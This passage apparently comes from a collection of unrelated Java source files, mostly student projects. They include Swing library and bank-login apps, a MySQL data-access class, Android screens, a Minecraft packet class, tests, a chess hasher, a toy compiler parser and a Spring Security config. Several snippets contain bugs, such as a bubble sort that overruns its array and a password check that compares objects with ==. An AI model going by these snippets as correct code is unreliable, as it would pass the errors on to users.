studentDetailsPanel;\r\n\tprivate JLabel studentIdLabel;\r\n\tprivate JLabel studentNameLabel;\r\n\tprivate JLabel courseLabel;\r\n\tprivate JLabel branchLabel;\r\n\tprivate JTextField returnBookIdField;\r\n\tprivate JTextField returnStudentIdField;\r\n\tprivate JButton returnfindButton;\r\n\tprivate JButton returnBookButton;\r\n\tprivate JPanel returnbookPanel;\r\n\tprivate JLabel returnissueIdLabel;\r\n\tprivate JLabel returnbooknameLabel;\r\n\tprivate JLabel returnstudentnameLabel;\r\n\tprivate JLabel returnissuedateLabel;\r\n\tprivate JLabel returnduedateLabel;\r\n\tprivate JPanel DashboardPanel;\r\n\tprivate JLabel numberofbookslabel;\r\n\tprivate JLabel numberofstudentslabel;\r\n\tprivate JLabel numberofissuedbookslabel;\r\n\tprivate JLabel numberOfBooksLabel;\r\n\tprivate JLabel numberOfIssuedBooksLabel;\r\n\tprivate JPanel contentPane;\r\n\tprivate JPanel panel_2;\r\n\tprivate JLabel timelabel;\r\n\tprivate JLabel datelabel;\r\n\tprivate JPanel panel;\r\n\tprivate JLabel openorcloselabel;\r\n\tprivate JLabel lblNewLabel_5;\r\n\tprivate JLabel lblNewLabel_2_1;\r\n\tprivate JLabel lblNewLabel_7;\r\n\tprivate JPanel HomePanel;\r\n\tprivate JPanel viewrecordsPanel;\r\n\tprivate JPanel viewissuedbooksPanel;\r\n\tprivate JLabel lblNewLabel_8;\r\n\tprivate JTable dashboardbook;\r\n\tprivate JTable dashboardstudenttable;\r\n\tprivate JPanel panel_4;\r\n\tprivate JPanel panel_5;\r\n\tprivate JPanel panel_1;\r\n\tprivate JLabel lblNewLabel_10;\r\n\tprivate JPanel panel_6;\r\n\tprivate JLabel lblNewLabel_15;\r\n\tprivate JLabel lblNewLabel_19;\r\n\tprivate JLabel lblNewLabel_20;\r\n\tprivate JPanel panel_7;\r\n\tprivate JButton clearButton;\r\n\tprivate JButton updatebutton;\r\n\tprivate JLabel lblNewLabel_21;\r\n\tprivate JLabel lblNewLabel_22;\r\n\tprivate JLabel lblNewLabel_23;\r\n\tprivate JLabel lblNewLabel_24;\r\n\tprivate JLabel label_4;\r\n\tprivate JLabel label_5;\r\n\tprivate JLabel label_6;\r\n\tprivate JLabel lblNewLabel_19_5;\r\n\tprivate JLabel lblNewLabel_19_6;\r\n\tprivate JLabel lblNewLabel_19_7;\r\n\tprivate JLabel returnbooknameLabel_1;\r\n\tprivate JLabel returnbooknameLabel_2;\r\n\tprivate JTable issuedBooksTable;\r\n\tprivate JScrollPane scrollPane_2;\r\n\tprivate JDateChooser issuedate;\r\n\tprivate JDateChooser duedate;\r\n\tprivate JDateChooser searchIssueDateChooser;\r\n\tprivate JDateChooser searchDueDateChooser;\r\n\tprivate JTable table_2;\r\n\tprivate JLabel lblNewLabel_26;\r\n\tprivate JPanel searchbookpanel;\r\n\tprivate JScrollPane scrollPane_3;\r\n\tprivate JTable searchtable;\r\n\tprivate boolean searchPerformed = false;\r\n\tprivate JScrollPane scrollPane_4;\r\n\tprivate JTextField textField;\r\n\tprivate JLabel numberofbooksquantitylabel;\r\n\tprivate JButton btnNewButton_2;\r\n\tpublic static void main(String[] args) {\r\n\t        EventQueue.invokeLater(new Runnable() {\r\n\t            public void run() {\r\n\t                try {\r\n\t                    // Load the JDBC driver\r\n\t                    Class.forName(\"com.mysql.cj.jdbc.Driver\");\r\n\t                } catch (ClassNotFoundException e) {\r\n\t                    e.printStackTrace();\r\n\t                    JOptionPan",
    "import java.sql.*;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class SummerVacationDAL\n{\n    private Connection connection;\n\n    // Notice that the databaseName, user and password are passed into this method. We are in the DAL,\n    // and we cannot prompt the user for this information. That should be done in the presentation layer\n    private void InitializeConnection(String databaseName, String user, String password)\n    {\n        try\n        {\n            if(connection == null)\n            {\n               connection = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/\" + databaseName, user, password);\n            }\n        } \n        catch (SQLException exception)\n        {\n            System.out.println(\"Failed to connect to the database\" + exception.getMessage());\n        }\n    }\n\n    public SummerVacationDAL(String databaseName, String userName, String password)\n    {\n        InitializeConnection(databaseName, userName, password);\n    }\n\n    public List<String> TryGetDestinationForActivity(String activityName)\n    {\n        List<String> parks = new ArrayList<String>();\n        try\n        {\n            PreparedStatement myStatement = connection.prepareStatement(\"Select * From Plan Where ActivityName = ?\");\n            myStatement.setString(1, activityName);\n            ResultSet myRelation = myStatement.executeQuery();\n            while(myRelation.next())\n            {\n               parks.add(myRelation.getString(\"ParkName\"));                \n            }\n            return parks;\n        }\n        catch(SQLException ex)\n        {\n            System.out.println(\"Failed to get activity destinations\" + ex.getMessage());\n            return parks;\n        }\n      }\n}",
    "package com.example.farmer;\n\nimport android.annotation.SuppressLint;\nimport android.os.Bundle;\n\nimport androidx.fragment.app.Fragment;\nimport androidx.recyclerview.widget.LinearLayoutManager;\nimport androidx.recyclerview.widget.RecyclerView;\n\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\n\nimport java.util.ArrayList;\n\n\npublic class history_Fragment extends Fragment {\n\nRecyclerView buyrecycle;\nArrayList<BuyAgainModel> buyagainirems = new ArrayList<>();\n\n    @SuppressLint(\"MissingInflatedId\")\n    @Override\n    public View onCreateView(LayoutInflater inflater, ViewGroup container,\n                             Bundle savedInstanceState) {\n        // Inflate the layout for this fragment\n        View view=inflater.inflate(R.layout.fragment_history_, container, false);\n      buyrecycle = view.findViewById(R.id.buyrecycle);\n      buyrecycle.setLayoutManager(new LinearLayoutManager(getContext()));\n\n      buyagainirems.add(new BuyAgainModel(R.drawable.fruitsalad,\"fruit\", \"200\"));\n        buyagainirems.add(new BuyAgainModel(R.drawable.fruitsalad,\"fruit\", \"200\"));\n        buyagainirems.add(new BuyAgainModel(R.drawable.fruitsalad,\"fruit\", \"200\"));\n\n        buyagainirems.add(new BuyAgainModel(R.drawable.fruitsalad,\"fruit\", \"200\"));\n        buyagainirems.add(new BuyAgainModel(R.drawable.fruitsalad,\"fruit\", \"200\"));\n        buyagainirems.add(new BuyAgainModel(R.drawable.fruitsalad,\"fruit\", \"200\"));\n        buyagainirems.add(new BuyAgainModel(R.drawable.fruitsalad,\"fruit\", \"200\"));\n        buyagainirems.add(new BuyAgainModel(R.drawable.fruitsalad,\"fruit\", \"200\"));\n        buyagainirems.add(new BuyAgainModel(R.drawable.fruitsalad,\"fruit\", \"200\"));\n        buyagainirems.add(new BuyAgainModel(R.drawable.fruitsalad,\"fruit\", \"200\"));\n        buyagainirems.add(new BuyAgainModel(R.drawable.fruitsalad,\"fruit\", \"200\"));\n        buyagainirems.add(new BuyAgainModel(R.drawable.fruitsalad,\"fruit\", \"200\"));\n        buyagainirems.add(new BuyAgainModel(R.drawable.fruitsalad,\"fruit\", \"200\"));\n        buyagainirems.add(new BuyAgainModel(R.drawable.fruitsalad,\"fruit\", \"200\"));\n        buyagainirems.add(new BuyAgainModel(R.drawable.fruitsalad,\"fruit\", \"200\"));\n        buyagainirems.add(new BuyAgainModel(R.drawable.fruitsalad,\"fruit\", \"200\"));\n        buyagainirems.add(new BuyAgainModel(R.drawable.fruitsalad,\"fruit\", \"200\"));\n        buyagainirems.add(new BuyAgainModel(R.drawable.fruitsalad,\"fruit\", \"200\"));\n        buyrecycle.setAdapter( new BuyAgainRecycleAdapter(buyagainirems));\n        return view;\n    }\n}",
    "package net.minecraft.network.play.server;\n\nimport java.io.IOException;\nimport java.util.List;\nimport net.minecraft.client.network.play.IClientPlayNetHandler;\nimport net.minecraft.network.IPacket;\nimport net.minecraft.network.PacketBuffer;\nimport net.minecraft.network.datasync.EntityDataManager;\n\npublic class SEntityMetadataPacket implements IPacket<IClientPlayNetHandler>\n{\n    private int entityId;\n    private List < EntityDataManager.DataEntry<? >> dataManagerEntries;\n\n    public SEntityMetadataPacket()\n    {\n    }\n\n    public SEntityMetadataPacket(int entityIdIn, EntityDataManager dataManagerIn, boolean sendAll)\n    {\n        this.entityId = entityIdIn;\n\n        if (sendAll)\n        {\n            this.dataManagerEntries = dataManagerIn.getAll();\n            dataManagerIn.setClean();\n        }\n        else\n        {\n            this.dataManagerEntries = dataManagerIn.getDirty();\n        }\n    }\n\n    /**\n     * Reads the raw packet data from the data stream.\n     */\n    public void readPacketData(PacketBuffer buf) throws IOException\n    {\n        this.entityId = buf.readVarInt();\n        this.dataManagerEntries = EntityDataManager.readEntries(buf);\n    }\n\n    /**\n     * Writes the raw packet data to the data stream.\n     */\n    public void writePacketData(PacketBuffer buf) throws IOException\n    {\n        buf.writeVarInt(this.entityId);\n        EntityDataManager.writeEntries(this.dataManagerEntries, buf);\n    }\n\n    /**\n     * Passes this Packet on to the NetHandler for processing.\n     */\n    public void processPacket(IClientPlayNetHandler handler)\n    {\n        handler.handleEntityMetadata(this);\n    }\n\n    public List < EntityDataManager.DataEntry<? >> getDataManagerEntries()\n    {\n        return this.dataManagerEntries;\n    }\n\n    public int getEntityId()\n    {\n        return this.entityId;\n    }\n}\n",
    "package resources.browser;\n\nimport org.openqa.selenium.WebDriver;\nimport org.openqa.selenium.firefox.FirefoxDriver;\nimport org.openqa.selenium.firefox.FirefoxOptions;\n\nimport java.util.concurrent.TimeUnit;\n\npublic class BrowserPage {\n    private WebDriver driver;\n    public BrowserPage(WebDriver _driver) {\n        driver = _driver;\n    }\n    public WebDriver OpenBrow(String url) {\n        // Establecer la propiedad del controlador de Firefox\n        System.setProperty(\"webdriver.gecko.driver\", \"C:\\\\Users\\\\Maria Jose\\\\Desktop\\\\PROYECTOS\\\\MY_PROJECTS\\\\BankProyectTestAutomation\\\\geckoDriver\\\\geckodriver.exe\");\n\n        // Opciones de configuraci\u00f3n para Firefox\n        FirefoxOptions options = new FirefoxOptions();\n        //options.addArguments(\"start-maximized\");\n\n        // Iniciar el navegador Firefox con las opciones\n        driver = new FirefoxDriver(options);\n\n        // Abrir la URL especificada\n        driver.get(url);\n\n        // Establecer un tiempo de espera impl\u00edcito\n        driver.manage().timeouts().implicitlyWait(10, TimeUnit.MINUTES);\n\n\n        return driver;\n    }\n\n}\n",
    "package com.campusdual.classroom;\n\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.DisplayName;\nimport org.junit.jupiter.api.Test;\n\nimport java.util.Calendar;\nimport java.util.Date;\n\nimport static org.junit.jupiter.api.Assertions.*;\n\nclass FreshMerchandiseTest {\n\n    private FreshMerchandise fm;\n\n    @BeforeEach\n    void setUp() {\n        fm = new FreshMerchandise(\"Item 1\", \"001-9\", \"Big Bussines\", 8,\n                \"C\", \"114D\", 53, new Date(1683194400000L));\n    }\n\n    @Test\n    @DisplayName(\"Test if FreshMerchandise expiration date is 04-05-2023\")\n    void testFormatDate() {\n        assertEquals(\"04-05-2023\", this.fm.getFormattedDate(this.fm.getExpirationDate()), \"Formatted expiration date is not 04-05-2023\");\n    }\n\n    @Test\n    @DisplayName(\"Test if FreshMerchandise getSpecificData() contains expiration date 04-05-2023\")\n    void testGetSpecificData() {\n        assertTrue(this.fm.getSpecificData().toString().contains(\"04-05-2023\"), \"Specific data String does not contain correct expiration date \u2192 04-05-2023\");\n    }\n}",
    "package com.in28minutes.springboot.microservice.example.currencyconversion.springbootmicroservicecurrencyconversion.models;\n\nimport java.math.BigDecimal;\nimport java.math.MathContext;\n\npublic class CurrencyConversionBean {\n    private Long id;\n    private String from;\n    private String to;\n    private BigDecimal conversionMultiple;\n    private BigDecimal quantity;\n    private BigDecimal totalCalculatedAmount;\n    private int port;\n\n    public CurrencyConversionBean(Long id, String from, String to, BigDecimal conversionMultiple, BigDecimal quantity, BigDecimal totalCalculatedAmount, int port) {\n        this.id = id;\n        this.from = from;\n        this.to = to;\n        this.conversionMultiple = conversionMultiple;\n        this.quantity = quantity;\n        this.totalCalculatedAmount = totalCalculatedAmount;\n        this.port = port;\n    }\n\n    public CurrencyConversionBean() {\n    }\n\n    public Long getId() {\n        return id;\n    }\n\n    public BigDecimal getConversionMultiple() {\n        return conversionMultiple;\n    }\n\n    public int getPort() {\n        return port;\n    }\n\n    public String getFrom() {\n        return from;\n    }\n\n    public String getTo() {\n        return to;\n    }\n\n    public BigDecimal getQuantity() {\n        return quantity;\n    }\n\n    public BigDecimal getTotalCalculatedAmount() {\n        return totalCalculatedAmount;\n    }\n}\n",
    "package Dm;\n\npublic class Inbox {\n    int i, j, n;\n    Message temp;\n\n    public Message Search_message(Message[] messages, Message toLook) {\n        //this method takes an array of type Message and returns the corresponding message if found after searching the array\n        for (Message message : messages) {\n            if (message.equals(toLook)) return toLook;\n        }\n        return null; //handle it in main -> if the message is not found prompt a message in the main\n    }\n\n    //for this method we also need to use aggregation\n    public Message[] sort_message(Message[] messages) {\n        for (i = 0; i < messages.length; i++) {\n            for (j = 0; j < messages.length - i; j++) {\n                if (messages[j].Message.compareTo(messages[j + 1].Message) > 0) {\n                    //swap elements\n                    temp.Message = messages[j].Message;\n                    messages[j].Message = messages[j + 1].Message;\n                    messages[j].Message = temp.Message;\n                }\n            }\n        }\n        return messages;\n    }\n}\n",
    "import java.io.File;\r\nimport java.io.FileReader;\r\nimport java.io.FileWriter;\r\nimport java.io.BufferedReader;\r\nimport java.io.IOException;\r\nimport java.util.concurrent.atomic.AtomicLong;\r\n\r\npublic class Zobrist {\r\n   \r\n   public static FileWriter writer;\r\n   public static File file;\r\n   public static long[][][] hashmap = new long[8][8][6];\r\n   public static long[] enPassant = new long[8];\r\n   public static long[] castling = new long[4];\r\n   public static long isBlack;\r\n   public static int percentCount = 1;\r\n   public static int currentLoad = 0;\r\n   public static boolean slowLoading = false;\r\n   \r\n   public static long getUniqueTimestamp() {\r\n      long max = 9223372036854775807L;\r\n      long min = max / 2;\r\n      return (long)(Math.random() * (max - min)) + min;\r\n   }\r\n   \r\n   public static void initalize() {\r\n      try {\r\n         writer = new FileWriter(\"ZobristData.txt\");\r\n         for (int row = 0; row < 8; row++) {\r\n            for (int col = 0; col < 8; col++) {\r\n               for (int index = 0; index < 6; index++) {\r\n                  hashmap[row][col][index] = getUniqueTimestamp();\r\n                  try {\r\n                     writer.write(\"\" + hashmap[row][col][index] + \",\");\r\n                  } catch (IOException ie) {\r\n                     ie.printStackTrace();\r\n                  }\r\n               }\r\n               writer.write(\"\\n\");\r\n            }\r\n         }\r\n         for (int col = 0; col < 8; col++) {\r\n            writer.write(getUniqueTimestamp() + \",\");\r\n         }\r\n         writer.write(\"\\n\");\r\n         for (int col = 0; col < 4; col++) {\r\n            writer.write(getUniqueTimestamp() + \",\");\r\n         }\r\n         writer.write(\"\\n\");\r\n         writer.write(\"\" + getUniqueTimestamp());\r\n         writer.close();\r\n      } catch (IOException ie) {\r\n         ie.printStackTrace();\r\n      }\r\n   } \r\n   \r\n   public static long getHash(Position position) {\r\n      long hash = 0;\r\n      for (int row = 0; row < 8; row++) {\r\n         for (int col = 0; col < 8; col++) {\r\n            int pieceValue = Math.abs(position.getBoard()[row][col]);\r\n            int hashIndex = -1;\r\n            if (pieceValue != 0) {\r\n               if (pieceValue == 1) {\r\n                  hashIndex = 0;\r\n               } else if (pieceValue == 3) {\r\n                  hashIndex = 1;\r\n               } else if (pieceValue == 4) {\r\n                  hashIndex = 2;\r\n               } else if (pieceValue == 5) {\r\n                  hashIndex = 3;\r\n               } else if (pieceValue == 9) {\r\n                  hashIndex = 4;\r\n               } else if (pieceValue == 15) {\r\n                  hashIndex = 5;\r\n               }\r\n               hash ^= hashmap[row][col][hashIndex];\r\n            }  \r\n         }\r\n      }\r\n      int[] castlingData = position.getCastlingData();\r\n      if (castlingData[1] == 1) {\r\n         if (castlingData[0] == 1) {\r\n            hash ^= castling[0];\r\n         }\r\n         if (castlingData[2] == 1) {\r\n            hash ^= castling[1];\r\n         }\r\n      }\r\n      if (castlingData[4] == 1) {\r\n         if (castlingData[3] == 1) {\r\n            hash ^= castling[2];\r\n         }\r\n         if (castlingData[5] == 1) {\r\n            hash ^= castling[3];\r\n         }\r\n      } \r\n      if (position.getEPassY() != -1) {\r\n         hash ^= enPassant[position.getEPassY()];\r\n      }\r\n      if (Chess.playerIsWhite) {\r\n         hash ^= isBlack;\r\n      } \r\n      return hash;\r\n   }\r\n   \r\n   public static Message getData() {\r\n      boolean status = true;\r\n      try {\r\n         BufferedReader reader = new BufferedReader(new FileReader(\"ZobristData.txt\"));\r\n         String line = reader.readLine();\r\n         int iteration = 0;\r\n         int count = 0;\r\n         boolean[] loadedItems = new boolean[3];\r\n         currentLoad = 64;\r\n         while (line != null) {\r\n            if (iteration <= 63) {\r\n               int index = line.indexOf(\",\");\r\n               while (index != -1) {\r\n                  hashmap[iteration / 8][iteration % 8][count] = Long.parseLong(line.substring(0, index));\r\n                  line = line.substring(index + 1);\r\n                  index = line.indexOf(\",\");\r\n                  count++; \r\n               }\r\n               count = 0;\r\n               line = reader.readLine();\r\n               chessGUI.loading.setPercent((int)(((100 / (double)loadingScreen.loadingItems) / 64.0) * iteration));\r\n            } else if (iteration == 64) {\r\n               if (!loadedItems[0]) {\r\n                  currentLoad = 8;\r\n                  loadedItems[0] = true;\r\n                  loadingScreen.loadingProgress++;\r\n               }\r\n               int index = line.indexOf(\",\");\r\n               count = 0;\r\n               while (index != -1) {\r\n                  enPassant[count] = Long.parseLong(line.substring(0, index));\r\n                  line = line.substring(index + 1);\r\n                  index = line.indexOf(\",\");\r\n                  chessGUI.loading.setPercent((100 / loadingScreen.loadingItems * 1) + (int)(((100 / (double)loadingScr",
    "package org.example;\r\n\r\nimport org.example.Lexer;\r\nimport org.example.Token.Token;\r\nimport org.example.Token.TokenType;\r\n\r\nimport java.util.ArrayList;\r\nimport java.util.List;\r\n\r\npublic class Parser {\r\n\r\n    private final Lexer lexer;\r\n    private final Emitter emitter;\r\n\r\n    public List<Token> variablesDeclared = new ArrayList<>(20);\r\n\r\n    private Token currentToken;\r\n    private Token nextToken;\r\n\r\n\r\n    public Parser(Lexer lexer, Emitter emitter) throws Exception {\r\n        this.lexer = lexer;\r\n        this.emitter = emitter;\r\n        lexer.getToken();\r\n    }\r\n\r\n    public  void nextToken() throws Exception {\r\n        this.currentToken = this.nextToken;\r\n        lexer.getToken();\r\n        this.nextToken = this.lexer.currentToken;\r\n    }\r\n\r\n    // Return true of the current token matches a specific type\r\n    public boolean checkToken(TokenType type) {\r\n        return type == this.lexer.currentToken.getType();\r\n    }\r\n\r\n    // Return true if the next token matches specific type\r\n    public boolean checkPeek(TokenType type) {\r\n        return type == this.lexer.currentToken.getType();\r\n    }\r\n\r\n    // Confirm current token type is expected\r\n    public void checkMatch(TokenType type) throws Exception {\r\n        if (checkToken(type)) {\r\n            this.nextToken();\r\n        } else {\r\n            throw new Exception(\"Expected \" + type + \" But Found \" + this.lexer.currentToken.getType());\r\n        }\r\n    }\r\n\r\n    public void parseProgram() throws Exception {\r\n        this.emitter.emitHeader(\"#include <stdio.h>\");\r\n        this.emitter.emitHeader(\"int main(void) {\");\r\n\r\n        // Parse the next statement\r\n        while (!checkToken(TokenType.EOF)){\r\n            parseStatement();\r\n        }\r\n\r\n        this.emitter.emitLine(\"return 0;\");\r\n        this.emitter.emitLine(\"}\");\r\n    }\r\n\r\n    public void parseStatement() throws Exception {\r\n\r\n        if (checkToken(TokenType.PRINT)){\r\n            // PRINT (expression | string)\r\n\r\n            nextToken();\r\n\r\n            if (checkToken(TokenType.STRING)) {\r\n                this.emitter.emitLine(\"printf(\\\"\" + lexer.currentToken.getValue() + \"\\\\n\\\");\");\r\n                nextToken();\r\n            } else{\r\n                // The input is an expression\r\n                this.emitter.emit(\"printf(\\\"%\" + \".2f\\\\n\\\", (float)(\");\r\n                expression();\r\n                this.emitter.emitLine(\"));\");\r\n            }\r\n        } else if (checkToken(TokenType.LET)) {\r\n            // \"LET\" ident = expression\r\n\r\n            nextToken();\r\n\r\n            // Check if variable has already been declared\r\n            if (!isDeclared(lexer.currentToken)){\r\n                this.variablesDeclared.add(lexer.currentToken);\r\n                this.emitter.emitHeader(\"float \" + lexer.currentToken.getValue() + \";\");\r\n            }\r\n\r\n            this.emitter.emit(lexer.currentToken.getValue() + \"=\");\r\n            checkMatch(TokenType.VARIABLE);\r\n            checkMatch(TokenType.EQUALS_OPERATOR);\r\n            expression();\r\n            this.emitter.emitLine(\";\");\r\n\r\n        } else if (checkToken(TokenType.INPUT)) {\r\n             // \"INPUT\" ident\r\n\r\n            nextToken();\r\n\r\n            // Check if variable has already been declared\r\n            if (!isDeclared(lexer.currentToken)){\r\n                this.variablesDeclared.add(lexer.currentToken);\r\n                this.emitter.emitHeader(\"float \" + lexer.currentToken.getValue() + \";\");\r\n            }\r\n\r\n            this.emitter.emitLine(\"if(0 == scanf(\\\"%\" + \"f\\\", &\" + lexer.currentToken.getValue() + \")) {\");\r\n            this.emitter.emitLine(lexer.currentToken.getValue() + \" = 0;\");\r\n            this.emitter.emit(\"scanf(\\\"%\");\r\n            this.emitter.emitLine(\"*s\\\");\");\r\n            this.emitter.emitLine(\"}\");\r\n\r\n            checkMatch(TokenType.VARIABLE);\r\n\r\n        } else if (checkToken(TokenType.IF)) {\r\n            // \"IF\" comparison \"THEN\" block \"ENDIF\"\r\n\r\n            nextToken();\r\n            this.emitter.emit(\"if(\");\r\n            comparison();\r\n\r\n            checkMatch(TokenType.THEN);\r\n            newLine();\r\n            this.emitter.emitLine(\"){\");\r\n\r\n            while(!checkToken(TokenType.ENDIF)) {\r\n                parseStatement();\r\n            }\r\n            checkMatch(TokenType.ENDIF);\r\n            this.emitter.emitLine(\"}\");\r\n\r\n        } else if (checkToken(TokenType.WHILE)) {\r\n            // \"WHILE\" comparison \"REPEAT\" block \"ENDWHILE\"\r\n\r\n            nextToken();\r\n            this.emitter.emit(\"while(\");\r\n            comparison();\r\n\r\n            checkMatch(TokenType.REPEAT);\r\n            newLine();\r\n            this.emitter.emitLine(\") {\");\r\n\r\n            while(!checkToken(TokenType.ENDWHILE)) {\r\n                parseStatement();\r\n            }\r\n\r\n            checkMatch(TokenType.ENDWHILE);\r\n            this.emitter.emitLine(\"}\");\r\n        } else {\r\n            throw new Exception(\"Invalid statement at TOKEN TYPE: \" + lexer.currentToken.getValue() + \" TOKEN VALUE: \" + lexer.currentToken.getType());\r\n        }\r\n\r\n        newLine(",
    "package com.resendil.loginauthapi.infra.security;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.http.HttpMethod;\nimport org.springframework.security.authentication.AuthenticationManager;\nimport org.springframework.security.config.annotation.authentication.configuration.AuthenticationConfiguration;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.config.http.SessionCreationPolicy;\nimport org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;\nimport org.springframework.security.crypto.password.PasswordEncoder;\nimport org.springframework.security.web.SecurityFilterChain;\nimport org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;\n\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n\n    @Autowired\n    private CustomUserDetailsService userDetailsService;\n\n    @Autowired\n    SecurityFilter securityFilter;\n\n    @Bean\n    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {\n        http\n                .csrf(csrf -> csrf.disable())\n                .sessionManagement(session -> session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))\n                .authorizeHttpRequests(authorize -> authorize\n                        .requestMatchers(HttpMethod.POST, \"/auth/login\").permitAll()\n                        .requestMatchers(HttpMethod.POST, \"/auth/register\").permitAll()\n                        .anyRequest().authenticated()\n                )\n                .addFilterBefore(securityFilter, UsernamePasswordAuthenticationFilter.class);\n        return http.build();\n    }\n\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder();\n    }\n\n    @Bean\n    public AuthenticationManager authenticationManager(AuthenticationConfiguration authenticationConfiguration) throws Exception {\n        return authenticationConfiguration.getAuthenticationManager();\n    }\n}",
    "package com.example.login;\n\nimport androidx.appcompat.app.AppCompatActivity;\n\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.EditText;\nimport android.widget.Toast;\n\npublic class Register extends AppCompatActivity {\n    private EditText username,password,confirm_password;\n    Button register;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        username= (EditText) findViewById(R.id.username);\n        password=(EditText) findViewById(R.id.password);\n        confirm_password=(EditText) findViewById(R.id.confirm_password);\n        register=(Button) findViewById(R.id.register);\n\n        register.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                if(username != null && password != null && confirm_password != null) {\n                    if(password == confirm_password){\n\n                    }else{\n                        Toast.makeText(Register.this, \"Password and Confirmed password don't match\", Toast.LENGTH_SHORT).show();\n                    }\n\n                }else {\n                    Toast.makeText(Register.this, \"All field must be filled\", Toast.LENGTH_SHORT).show();\n                }\n            }\n        });\n\n    }\n}",
    "package application;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Locale;\nimport java.util.Scanner;\n\nimport entities.Employee;\nimport entities.OutsourcedEmployee;\n\npublic class Program {\n\n\tpublic static void main(String[] args) {\n\t\t\n\t\tLocale.setDefault(Locale.US);\n\t\tScanner sc = new Scanner(System.in);\n\t\t\n\t\tList<Employee> list = new ArrayList<>();\n\t\t\n\t\tSystem.out.print(\"Enter the number of employees: \");\n\t\tint n = sc.nextInt();\n\t\t\n\t\tfor(int i=1; i<=n; i++){\n\t\t\tSystem.out.println(\"Empolyee #\" + i + \" data: \");\n\t\t\tSystem.out.print(\"Outsourced (y/n)? \");\n\t\t\tchar ch = sc.next().charAt(0);\n\t\t\tSystem.out.print(\"Name: \");\n\t\t\tsc.nextLine();\n\t\t\tString name = sc.nextLine();\n\t\t\tSystem.out.print(\"Hours: \");\n\t\t\tint hours = sc.nextInt();\n\t\t\tSystem.out.print(\"Value per hour: \");\n\t\t\tdouble valuePerHour = sc.nextDouble();\n\t\t\t\n\t\t\tif(ch == 'y'){\n\t\t\t\tSystem.out.print(\"Additional charge: \");\n\t\t\t\tdouble additionalCharge = sc.nextDouble();\n\t\t\t\t//Employee emp = new OutsourcedEmployee(name, hours, valuePerHour,additionalCharge);\n\t\t\t\tlist.add(new OutsourcedEmployee(name, hours, valuePerHour,additionalCharge));\n\t\t\t}\n\t\t\telse {\n\t\t\t\t//Employee emp = new Employee(name, hours, valuePerHour);\n\t\t\t\tlist.add(new Employee(name, hours, valuePerHour));\n\t\t\t}\n\t\t}\n\t\t\n\t\tSystem.out.println();\n\t\tSystem.out.println(\"Payments: \");\n\t\tfor (Employee emp : list){\n\t\t\tSystem.out.println(emp.getName() + \" - US$ \" + String.format(\"%.2f\", emp.payment()));\n\t\t}\n\t\t\n\t\tsc.close();\n\t}\n\n}\n",
    "package CanerBank;\n\nimport java.awt.EventQueue;\n\nimport javax.swing.JFrame;\nimport javax.swing.JButton;\nimport javax.swing.JComboBox;\n\nimport java.awt.event.ActionListener;\nimport java.awt.event.WindowAdapter;\nimport java.awt.event.WindowEvent;\nimport java.awt.event.ActionEvent;\nimport javax.swing.JLabel;\nimport javax.swing.JOptionPane;\nimport javax.swing.JTextArea;\nimport javax.swing.SwingConstants;\nimport java.awt.Font;\nimport java.awt.Color;\nimport javax.swing.JInternalFrame;\n\npublic class Login {\n\n\tprivate JFrame frame;\n\n\t/**\n\t * Launch the application.\n\t */\n\tpublic static void main(String[] args) {\n\t\tEventQueue.invokeLater(new Runnable() {\n\t\t\tpublic void run() {\n\t\t\t\ttry {\n\t\t\t\t\tLogin window = new Login();\n\t\t\t\t\twindow.frame.setVisible(true);\n\t\t\t\t} catch (Exception e) {\n\t\t\t\t\te.printStackTrace();\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\t}\n\n\t/**\n\t * Create the application.\n\t */\n\tpublic Login() {\n\t\tinitialize();\n\t}\n\n\tprivate void initialize() {\n\t\tDataBase db1 = new DataBase();\n\t\tframe = new JFrame(\"Caner Bank Giri\u015f Ekran\u0131\");\n\t\tframe.getContentPane().setBackground(new Color(255, 255, 255));\n\t\tframe.getContentPane().setForeground(new Color(255, 255, 255));\n\t\tframe.setResizable(false);\n\t\tframe.setBounds(400, 200, 683, 359);\n\t\t\n\t\tframe.addWindowListener(new WindowAdapter() {\n            public void windowClosing(WindowEvent e) {\n                String[] puanOptions = {\"1\", \"2\", \"3\", \"4\", \"5\"};\n                JComboBox<String> puanComboBox = new JComboBox<>(puanOptions);\n                JTextArea feedbackTextArea = new JTextArea(5, 20);\n\n                Object[] message = {\n                        \"Soru 1: Uygulamam\u0131z\u0131 5 \u00fczerinden nas\u0131l puanlars\u0131n\u0131z?\",\n                        puanComboBox,\n                        \"\\nSoru 2: Geri bildirim yapar m\u0131s\u0131n\u0131z?\",\n                        feedbackTextArea\n                };\n\n                int choice = JOptionPane.showConfirmDialog(\n                        frame,\n                        message,\n                        \"Anket, De\u011ferlendirmeniz i\u00e7in te\u015fekk\u00fcr ederiz.\",\n                        JOptionPane.OK_CANCEL_OPTION,\n                        JOptionPane.PLAIN_MESSAGE);\n                if (choice == JOptionPane.OK_OPTION) {\n                    \n                    int puan = Integer.parseInt((String) puanComboBox.getSelectedItem());\n                    String feedback = feedbackTextArea.getText();\n                    db1.insertAnket(puan, feedback);\n                }\n                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n            }\n\t\t});\t\t\n\t\tJButton btnNewButton = new JButton(\"Personel\");\n\t\tbtnNewButton.setBounds(241, 86, 200, 100);\n\t\tbtnNewButton.setForeground(new Color(255, 255, 